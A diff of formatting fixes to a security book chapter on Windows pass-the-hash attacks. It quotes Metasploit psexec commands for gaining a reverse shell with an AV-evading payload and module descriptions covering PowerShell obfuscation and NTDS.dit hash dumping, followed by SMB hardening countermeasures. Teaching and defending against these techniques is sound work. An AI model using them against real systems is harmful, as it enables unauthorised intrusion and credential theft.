@@ -121,7 +121,7 @@ G> `set lhost <IP address that we are going to be listening on for the reverse s
 G> `set rhost <IP address of target>`  
 G> `set exe::custom /usr/share/veil-output/compiled/encrypted-payload.exe`  
 G> `set smbuser <target username>`  
-G> `set [smbpass](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md#options) <target password or hash>`  
+G> `set` [`smbpass`](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md#options) <target password or hash>  
 G> `run`
 G>
 G> The IP addresses and ports need to be the same as you specified in the creating of the payload using Veil-Evasion.
@@ -139,7 +139,7 @@ G> `sessions -i 1`
 G>
 G> From here on in, the [video](https://www.youtube.com/watch?v=1EvwwYiMrV4) demonstrates creating a new file beside the targets hosts file, thus demonstrating full system privileges.
 
-Just before the Synopsis, I mentioned that there were several behavioural techniques for the `psexec` module. One of the other techniques, called "MOF Upload Target" is to use Managed Object Format (MOF) files which use the C++ syntax. These MOF files must be compiled and are then consumed by Windows Management Instrumentation (WMI). This works quite differently, `psexec` does not execute anything, all it does is upload your executable to `SYSTEM32`, and a MOF file to `SYSTEM32\wbem\mof\`. When windows receives the event for the new MOF file, it compiles and executes it, which tells Windows to run the paylod in `SYSTSEM32`. Metasploit's MOF library only works with Windows XP and Server 2003. There is also the same high chance of getting sprung by AV, although you can carry out similar tricks as we did above to get around the AV signatures.
+Just before the Synopsis, I mentioned that there were several behavioural techniques for the `psexec` module. One of the other techniques, called "MOF Upload Target" is to use Managed Object Format (MOF) files which use the C++ syntax. These MOF files must be compiled and are then consumed by Windows Management Instrumentation (WMI). This works quite differently, `psexec` does not execute anything, all it does is upload your executable to `SYSTEM32`, and a MOF file to `SYSTEM32\wbem\mof\`. When windows receives the event for the new MOF file, it compiles and executes it, which tells Windows to run the paylod in `SYSTSEM32`. Metasploits MOF library only works with Windows XP and Server 2003. There is also the same high chance of getting sprung by AV, although you can carry out similar tricks as we did above to get around the AV signatures.
 
 If you are running a penetration test for a client and your targets AV fires, then it could be game over for you. There are better options that exist now that are less likely to ring alarm bells with your target.
 
@@ -147,7 +147,7 @@ If you are running a penetration test for a client and your targets AV fires, th
 
 We have just detailed and demonstrated the first of the Metasploit PTH suite above. Kali Linux also has the "[Pass the Hash toolkit](https://www.kali.org/tutorials/pass-the-hash-toolkit-winexe-updates/)" (with all tools prefixed with "pth-"). The following are the rest of the Metasploit PTH modules in order of when they were introduced. All of the PTH suite except `psexec_ntdsgrab` depend on [CVE-1999-0504](https://www.cvedetails.com/cve/cve-1999-0504). They also all make use of the PsExec utility except the last one `wmi`. You will notice that some of these are exploits and some are technically auxiliary modules, as you read their descriptions, you will understand why.
 
-1. `[current_user_psexec](https://www.rapid7.com/db/modules/exploit/windows/local/current_user_psexec)` (2012-08-01) `exploit/windows/local/current_user_psexec`  
+1. [`current_user_psexec`](https://www.rapid7.com/db/modules/exploit/windows/local/current_user_psexec) (2012-08-01) `exploit/windows/local/current_user_psexec`  
    "PsExec via Current User Token"   
    
    1. This module uploads an executable file to the victim system, then creates a share containing that executable
@@ -158,17 +158,17 @@ We have just detailed and demonstrated the first of the Metasploit PTH suite abo
    
    This is a local exploit, it has to be run from an already compromised administrator that you have a Meterpreter session on, a reverse shell for example, against your target, this is where the pivot occurs.  
 
-2. `[psexec_command](https://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_command)` (2012-11-23) `auxiliary/admin/smb/psexec_command`  
+2. [`psexec_command`](https://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_command) (2012-11-23) `auxiliary/admin/smb/psexec_command`  
    "Microsoft Windows Authenticated Administration Utility"  
    
    This module passes the valid administrator credentials, then executes a single arbitrary Windows command on one or more target systems, using a similar technique to the PsExec utility provided by SysInternals. This will not trigger AV as no binaries are uploaded, we are simply leveraging cmd.exe. but it also does not provide a meterpreter shell. Concatenating commands with '&' does not work.  
 
-3. `[psexec_loggedin_users](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/psexec_loggedin_users)` (2012-12-05) `auxiliary/scanner/smb/psexec_loggedin_users`   
+3. [`psexec_loggedin_users`](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/psexec_loggedin_users) (2012-12-05) `auxiliary/scanner/smb/psexec_loggedin_users`   
    "Microsoft Windows Authenticated Logged In Users Enumeration"  
    
    This module passes the valid administrator credentials, then using a similar technique to that of the PsExec utility queries the HKU base registry key on the remote machine with reg.exe to get the list of currently logged in users. Notice this is a scanner module, so it can be run against many target machines concurrently.  
 
-4. `[psexec_psh](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh)` (2013-1-21) `exploit/windows/smb/psexec_psh`  
+4. [`psexec_psh`](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh) (2013-1-21) `exploit/windows/smb/psexec_psh`  
    "Microsoft Windows Authenticated Powershell Command Execution"  
    
    This module passes the valid administrator credentials as usual, then attempts to execute a powershell payload using a similar technique to the PsExec utility. This method is far less likely to be detected by AV because: PowerShell is native to Windows, each payload is unique because it is your script and it is just base64 encoded, more likely to escape signature based detection, it also never gets written to disk. It is executed from the commandline using the `-encodedcommand ` flag and provides the familiar Meterpreter shell.  
@@ -177,7 +177,7 @@ We have just detailed and demonstrated the first of the Metasploit PTH suite abo
    * "_In the event of a sandbox observing PowerShell execution, a delay and other obfuscation may be added to avoid detection._"
    * "_In order to avoid interactive process notifications for the current user, the PowerShell payload has been reduced in size and wrapped in a PowerShell invocation which hides the window entirely._"  
 
-5. `[psexec_ntdsgrab](https://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_ntdsgrab)` (2013-03-15) `auxiliary/admin/smb/psexec_ntdsgrab`  
+5. [`psexec_ntdsgrab`](https://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_ntdsgrab) (2013-03-15) `auxiliary/admin/smb/psexec_ntdsgrab`  
    "PsExec `NTDS.dit` And SYSTEM Hive Download Utility"  
    
    Similar to SmbExec that we setup in the Tooling Setup chapter of Fascicle 0, this Metasploit module authenticates to an Active Directory Domain Controller and creates a volume shadow copy of the %SYSTEMDRIVE% using a native Windows tool "vssadmin" (visible in the [source](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/psexec_ntdsgrab.rb#L55)). It then pulls down copies of the `NTDS.dit` file as well as the SYSTEM registry hive and stores them. The `NTDS.dit` and SYSTEM registry hive copy can be used in combination with other tools for offline extraction of AD password hashes. All of this is done without uploading a single binary to the target host.  
@@ -185,8 +185,8 @@ We have just detailed and demonstrated the first of the Metasploit PTH suite abo
    There are additional details around where `NTDS.dit` fits into the picture in the [Windows section](#web-applications-countermeasures-management-of-application-secrets-store-configuration-windows) of the Web Applications chapter.  
    
    Unlike SmbExec, we have to parse the files that `psexec_ntdsgrab` downloads for us with a separate tool.  
-   
-   6. `[wmi](https://www.rapid7.com/db/modules/exploit/windows/local/wmi)` (2013-09-21) `exploit/windows/local/wmi`  
+
+6. [`wmi`](https://www.rapid7.com/db/modules/exploit/windows/local/wmi) (2013-09-21) `exploit/windows/local/wmi`  
    "Windows Management Instrumentation (WMI) Remote Command Execution"  
    
    Before we cover the Metasploit module, let's gain a little more understanding around what WMI is, when it was introduced, how wide spread its consumption is, etc.  
@@ -714,14 +714,15 @@ Bringing your VPS(s) in-house provides all the flexibility/power required to mit
 
 %% https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/1
 
-Defence in depth will help here, the attacker should not be in possession of your admin passwords or hashes. If this has already happened, how did it happen, and take the necessary steps to make sure it does not happen again.
+Defence in depth will help here, the attacker should not be in possession of your admin passwords or hashes. If this has already happened, how did it happen? Take the necessary steps to make sure it does not happen again.
 
 Samba is not usually installed on Linux by default, but as we are dealing with Windows here, you do not have the option of whether SMB is installed and running on your machines.
 
-Port scan your target machines
-Close the SMB related ports 445 TCP, earlier OS's used 137, 138, 139
-Port scan again to verify.
-Turn off public folder sharing.
+* Port scan your target machines
+* Close the SMB related ports 445 TCP, earlier OS's used 137, 138, 139
+* Port scan again to verify
+* Turn off public folder sharing
+
 Check the list of requirements for PsExec and turn of / disable what you can.
 
 Try and re-exploit with the provided directions in the [Identify Risks](#vps-identify-risks-psexec) section.
